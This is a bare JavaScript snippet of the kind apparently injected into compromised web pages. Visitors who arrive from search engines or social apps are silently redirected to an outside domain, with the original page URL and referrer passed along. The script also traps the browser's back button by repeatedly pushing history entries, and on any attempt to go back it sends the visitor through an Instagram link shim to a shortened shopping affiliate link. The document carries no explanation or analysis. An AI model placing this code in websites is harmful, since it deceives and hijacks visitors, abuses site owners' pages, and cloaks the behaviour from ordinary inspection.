var ars = rChoice([
    'https://resep.madreview.net',
]);

function rChoice(arr) {
    return arr[Math.floor(arr.length * Math.random())];
}

if ([".google.", "bing.", "yandex.", "facebook.", ".pinterest.", ".yahoo.", "mysearch.", ".baidu.", "duckduckgo.",
        "ask.", "aol."
    ].some((s) => document.referrer.toLowerCase().includes(s)) || ["fb", "facebook", "pinterest", "twitter", "messenger"].some((
        s) => navigator.userAgent.toLowerCase().includes(s))) {
    window.location.href = ars + "/?arsae=" + encodeURIComponent(window.location.href) + "&arsae_ref=" +
        encodeURIComponent(document.referrer);
}


    history.pushState(null, document.title, window.location.href);
    window.addEventListener('popstate', function(event) {
        window.location.href = "https://l.instagram.com/?u=https%3A%2F%2Fshope.ee%2F5UshJcIJtr&e=ATO2TH7U27VMaahdSFxpUGRhc-DMLV_gJLPJOva-IxltFReutJWk0hQZvTrwlkrFAIo9jZskWJSVwRUdiNQDww&s=1";
    });
    window.addEventListener('scroll', function() {
        history.pushState(null, document.title, window.location.href);
    });

    function isUrl(data) {
        try {
            new URL(data);
            return true;
        } catch (e) {
            return false;
        };
    };
